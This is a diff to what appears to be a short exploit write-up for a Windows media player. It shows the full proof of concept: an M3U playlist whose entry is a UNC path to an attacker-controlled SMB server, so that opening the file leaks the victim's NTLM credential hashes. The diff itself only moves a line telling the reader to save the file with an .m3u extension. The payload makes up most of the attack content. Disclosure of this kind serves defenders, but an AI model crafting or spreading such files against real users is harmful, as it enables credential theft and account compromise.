@@ -22,7 +22,6 @@ target automatically leaks credentials in the form of NTLM hashes.
 Tested on windows 7  “all player"
 
 
-
 PoC :
 
 #EXTM3U
@@ -30,9 +29,9 @@ PoC :
 
 \\attacker_smb_server\ROPNOP
 
+Save it as m3u extention.
 
 ![Alt text](https://raw.githubusercontent.com/kofa2002/NTLM-THEFT/master/Screenshot%20from%202019-05-04%2008-11-15.png?token=AB5ULGT5JPE2CEWY65V6ZWC44PVTW "NTLM Leaked")
 
-Save it as m3u extention.
 
 Author : Soufian El Hachmi
